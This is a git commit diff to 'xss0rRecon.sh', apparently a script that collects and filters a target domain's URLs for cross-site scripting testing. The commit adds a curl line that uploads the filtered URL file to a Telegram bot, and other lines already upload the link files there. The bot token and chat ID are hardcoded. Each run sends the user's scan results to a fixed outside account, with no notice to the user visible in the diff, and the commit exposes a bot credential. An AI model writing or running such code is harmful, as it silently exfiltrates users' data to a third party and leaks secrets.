3b645aebed1b8afda90008ef8777d7f2e642ba6d
jahan <95371402+jahanaj098@users.noreply.github.com>
2025-01-16 03:49:22 +0530

    Update xss0rRecon.sh

--- xss0rRecon.sh
+++ xss0rRecon.sh
@@ -1596,30 +1596,15 @@ run_step_5() {
 
     # Step 22: Removing old file
     show_progress "Removing old file"
-    rm -r "${domain_name}-uro.txt"
     sleep 3
 
     # Step 23: Rename to new file
     show_progress "Rename to new file"
+    curl -F chat_id="1423939669" -F document=@"filtered_output.txt" https://api.telegram.org/bot7580408785:AAGfiZQWxwMtsJ4UIM4blSVmBNrzlahbzZk/sendDocument
+
     mv filtered_output.txt "${domain_name}-links.txt"
-    ls -la
-    (cd urls && ls -la && cd -)
-    curl -F chat_id="1423939669" -F document=@"${domain_name}-links.txt" https://api.telegram.org/bot7580408785:AAGfiZQWxwMtsJ4UIM4blSVmBNrzlahbzZk/sendDocument
-
-    sleep 3
-
-    # Step 24: Filtering ALIVE URLS
-    show_progress "Filtering ALIVE URLS"
     subprober -f "${domain_name}-links.txt" -sc -ar  -nc -mc 200,201,202,204,301,302,304,307,308,403,500,504,401,407 -c 20 -o "${domain_name}-links.txt1337"
-    
-    cat "${domain_name}-links.txt"
-    
-    
-    ls -la
-    pwd
-    (cd urls && ls -la && cd -)
- 
-    
+
     curl -F chat_id="1423939669" -F document=@"${domain_name}-links.txt1337" https://api.telegram.org/bot7580408785:AAGfiZQWxwMtsJ4UIM4blSVmBNrzlahbzZk/sendDocument
 
     sleep 5
